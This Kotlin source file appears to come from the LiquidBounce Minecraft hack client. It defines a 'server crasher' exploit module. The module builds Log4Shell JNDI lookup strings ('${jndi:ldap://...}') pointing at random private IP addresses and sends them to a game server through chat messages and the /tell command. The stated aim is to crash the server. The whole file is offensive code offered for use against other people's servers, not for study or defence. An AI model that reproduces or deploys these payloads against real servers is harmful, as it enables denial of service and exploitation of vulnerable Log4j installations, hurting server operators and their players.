package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits.types.ChatExploit
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits.types.CommandExploit
import org.apache.commons.lang3.RandomStringUtils

/**
 * Log4j exploit taken from FDP Client
 *
 * https://github.com/SkidderMC/FDPClient/blob/9e43a99a4c7614bccf5192bf7e26e6a320a3e0f5/src/main/java/net/ccbluex/liquidbounce/features/module/modules/exploit/ServerCrasher.kt#L565-L572
 */
private val exploitLog4j = {
    "\${jndi:ldap://192.168.${(1..253).random()}.${(1..253).random()}}"
}

/**
 * Log4j exploit
 *
 * Uses Log4j to crash the server.
 */
object Log4jChatExploit : ChatExploit("Log4jChat", {
    "${RandomStringUtils.randomAlphabetic(4)}${exploitLog4j()}${RandomStringUtils.randomAlphabetic(4)}"
})

object Log4jTellExploit : CommandExploit("Log4jTell", {
    "tell ${RandomStringUtils.randomAlphabetic(4)} ${exploitLog4j()}"
})
